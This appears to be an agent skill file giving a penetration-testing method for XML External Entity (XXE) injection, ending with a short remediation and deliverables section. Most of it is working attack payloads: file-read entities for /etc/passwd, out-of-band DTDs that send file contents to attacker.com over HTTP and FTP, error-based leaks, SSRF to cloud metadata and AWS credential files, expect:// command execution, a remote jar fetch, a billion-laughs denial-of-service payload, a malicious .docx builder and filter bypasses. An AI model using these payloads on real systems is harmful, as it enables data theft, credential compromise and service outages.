---
name: xxe
description: Detect, exploit, and remediate XML External Entity (XXE) injection covering in-band file reads, blind out-of-band parameter-entity exfiltration, error-based extraction, SSRF to cloud metadata, RCE via PHP expect and Java jar wrappers, document upload vectors, and parser hardening.
---

# XML External Entity Injection (XXE)

Methodology for discovering and weaponizing XXE vulnerabilities where an XML parser processes attacker-controlled DTDs, enabling local file disclosure, SSRF to cloud metadata, internal port scanning, remote code execution via protocol wrappers, and denial of service.

## When to use this skill

- Auditing endpoints that accept XML input: SOAP APIs, REST XML bodies, SAML assertions, RSS/Atom feeds, XML-RPC (WordPress `xmlrpc.php`), config importers, JSON-to-XML converters.
- Testing file upload features that parse document formats embedding XML: Office Open XML (`.docx`, `.xlsx`, `.pptx`), SVG, MathML, PDF, XMP metadata, OPML, GPX, XSLT.
- Probing parsers in Java (javax.xml, SAX, DOM, StAX), .NET (`XmlDocument`, `XmlReader`), PHP (`libxml`, `simplexml`, `DOMDocument`), Python (`lxml`, `xml.etree`, `xml.sax`), and libxml2-based applications.
- Chaining SSRF from XML parsing to cloud instance metadata (AWS IMDS at `169.254.169.254`, GCP/Azure equivalents).
- Any endpoint returning `text/xml` or `application/xml` content-type regardless of apparent purpose.

## Methodology

### 1. Detection Probes (Parser Fingerprinting)

Send a minimal external entity probe to any endpoint accepting XML and observe differential behavior (response time, error text, content length):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe "probe">]>
<foo>&xxe;</foo>
```

A reflected `probe` confirms entity substitution is enabled. Escalate to a file-read entity immediately:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

The parser resolves the entity and the endpoint returns the file contents in-band. Fingerprint the underlying library from error text: libxml2, MSXML, Xerces, and PHP's XML parser each produce distinct exception signatures.

### 2. Blind Out-of-Band Exfiltration via Parameter Entities

When the response suppresses entity output, host an external DTD and exfiltrate over DNS/HTTP. The submitted document:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote;]>
<foo>&send;</foo>
```

The hosted `evil.dtd` chains parameter entities to embed the file inside a second outbound request:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://attacker.com/?leak=%file;'>">
%int;
%send;
```

The `%trick;` pattern wraps the inner entity declaration so the file content rides the outbound URL. For multiline files, wrap content in CDATA to survive XML parsing of the exfiltrated payload:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://attacker.com/?d=%wrap;%file;%end;'>">
%int;
%send;
```

Blind XXE also works over FTP — `ftp://attacker.com/` triggers an outbound FTP connection whose control-channel commands carry the exfiltrated data, useful where HTTP egress is blocked:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://attacker.com/%file;'>">
%int;
%send;
```

### 3. Error-Based XXE

Force the parser to embed file content in an error message by referencing a nonexistent resource whose URI contains the target file:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
  %file;
  %eval;
  %error;
]>
<foo>x</foo>
```

The parser fails to resolve `file:///nonexistent/<file contents>` and the resulting exception message leaks the file contents to the response or logs. This variant works even when outbound network access is fully blocked, since the exfiltration channel is the parser's own error path.

### 4. SSRF Pivot to Cloud Metadata

Use the parser's URL-fetching capability to pivot into internal networks and cloud control planes:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<foo>&xxe;</foo>
```

Read local process environment and cloud credentials via file wrappers:

```xml
<!ENTITY env SYSTEM "file:///proc/self/environ">
<!ENTITY aws SYSTEM "file:///home/ec2-user/.aws/credentials">
```

Chain the retrieved IAM role name into a second request for temporary credentials, then use those credentials against the cloud API. Enumerate internal services by fetching `http://internal-host:port/` through the entity and observing connection timing and error differentials — the parser becomes a blind internal port scanner.

### 5. Remote Code Execution via Protocol Wrappers

PHP's `expect://` wrapper executes commands when the expect extension is loaded:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>
```

Java parsers support `jar://`, which downloads a remote JAR and extracts an entry — usable to read files inside archives or to pull attacker-controlled content onto the host:

```xml
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file.txt">
```

Also test `php://filter/convert.base64-encode/resource=/etc/passwd` for encoded reads and `file://` with directory listing behavior on Java (`file:///` returns directory listings on some parsers).

### 6. XInclude in SOAP/XML-RPC

When the DTD is stripped but the parser supports XInclude, inject an `xi:include` element into a SOAP body or XML-RPC value:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </data>
  </soap:Body>
</soap:Envelope>
```

XInclude requires no DOCTYPE at all, making it the primary vector when DTD declarations are filtered. WordPress `xmlrpc.php` pingback requests (`pingback.ping`) accept a URL parameter that the parser fetches server-side — a built-in SSRF primitive even without entity support.

### 7. Denial of Service: Billion Laughs & Quadratic Blowup

Recursive entity expansion exhausts parser memory:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

The quadratic blowup variant repeats a single large entity tens of thousands of times in one element, consuming memory without recursion. Confirm DoS impact with a single request and document the parser's entity-expansion limit (or absence thereof).

### 8. Document Upload Vectors

Office documents are ZIP archives containing XML parts — inject a DTD into `[Content_Types].xml` or `word/document.xml` and upload the crafted `.docx`/`.xlsx`:

```bash
mkdir docx && cd docx
unzip ../template.docx
python3 - <<'EOF'
import re
p = "[Content_Types].xml"
s = open(p).read()
s = s.replace("<Types ", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><Types ", 1)
open(p, "w").write(s)
EOF
zip -r ../evil.docx .
```

SVG and MathML are raw XML — upload an SVG containing a DOCTYPE and entity; image renderers that parse SVG server-side (thumbnailers, avatar pipelines) resolve it. PDF XMP metadata, GPX track files, OPML feed lists, and XSLT stylesheets all accept entity declarations. Test each upload path that reaches a server-side parser, not just client-side rendering.

### 9. Conversion & Feed Surfaces

JSON-to-XML converters (SOAP gateways, enterprise ESBs) accept JSON that is internally serialized to XML — inject XML entity syntax through JSON string values. RSS/Atom feed readers fetch and parse attacker-hosted feeds: host a feed with a DTD and point the application's import feature at it. SAML metadata parsers and SSO endpoints process IdP-supplied XML — a malicious IdP metadata document is a classic blind-XXE delivery. Enumerate every importer, webhook, and integration endpoint as an XXE surface.

### 10. Filter Bypasses & Charset Tricks

- **UTF-16 wrapping:** encode the payload in UTF-16 with a BOM; filters matching ASCII `<!DOCTYPE` miss it while the parser auto-detects the encoding.
- **Encoding declarations:** `<?xml version="1.0" encoding="UTF-16"?>` in UTF-8 content, or vice versa, defeats naive byte-level filters.
- **External DTD relocation:** when `SYSTEM` is blocked, use `PUBLIC` identifiers (`<!ENTITY % remote PUBLIC "-//X//Y" "http://attacker.com/evil.dtd">`).
- **Protocol alternation:** rotate `file://`, `php://`, `jar://`, `ftp://`, `gopher://`, `http://` per parser support.
- **libxml2 version matrix:** libxml2 ≥ 2.9.0 disables external entities by default (bypass requires explicit `XML_PARSE_NOENT`); versions below 2.9 resolve external entities by default. PHP < 8.0 with `libxml_disable_entity_loader()` unset is vulnerable; PHP 8.0+ removed the loader function and hardened defaults. Java SAX/DOM remain vulnerable unless `FEATURE_SECURE_PROCESSING` or `XMLConstants.FEATURE_SECURE_PROCESSING` is set explicitly.

## Tooling

- **xxeserv / OOB server (interactsh)** — listener for out-of-band HTTP/FTP/DNS exfiltration callbacks.
- **Burp Suite Collaborator** — hosted OOB payload correlation for blind XXE confirmation.
- **phpggc / custom DTD hosting** — serving crafted `evil.dtd` payloads during blind testing.
- **Python (lxml, defusedxml)** — reproducing parser behavior locally and crafting document-part injections.
- **zip / Python zipfile** — rebuilding malicious `.docx`/`.xlsx` archives with injected XML parts.
- **ssrf-sheriff rules review / cloud IMDSv2 config** — validating remediation of the SSRF pivot.

## Verification & Deliverables

1. **PoC:** For each vulnerable endpoint, the exact XML payload, the parser response (in-band file contents, OOB callback log, or error message), and the exfiltrated data sample. Include the parser fingerprint and libxml2/library version.
2. **Impact:** Files readable (passwd, application config, cloud credentials), internal services reachable via SSRF, RCE capability (expect://, jar://), and DoS reachability (billion laughs).
3. **Remediation:**
   - **Disable DTDs entirely** — configure parsers with `XML_PARSE_NONET | XML_PARSE_NOENT` unset, Java `FEATURE_SECURE_PROCESSING`, .NET `DtdProcessing=Prohibit`, Python `defusedxml`.
   - **Network egress controls** — block parser-initiated outbound HTTP/DNS/FTP from application subnets; deny link-local `169.254.0.0/16`; enforce IMDSv2 (`HttpTokens=required`, `HttpPutResponseHopLimit=1`).
   - **Harden upload parsers** — reject documents containing `<!DOCTYPE`/`<!ENTITY` in embedded XML parts; minimize error verbosity so parser exceptions never surface entity or file paths.

**Deliverables**

- Findings table: endpoint, parser/library version, XXE class (in-band/blind/error/OOB), files read, SSRF reach, severity.
- PoC scripts: crafted XML payloads, malicious `.docx`/`.svg` generators, and OOB DTD hosting setup.
- Remediation matrix: parser configuration per service, egress rules applied, and upload-validation coverage.
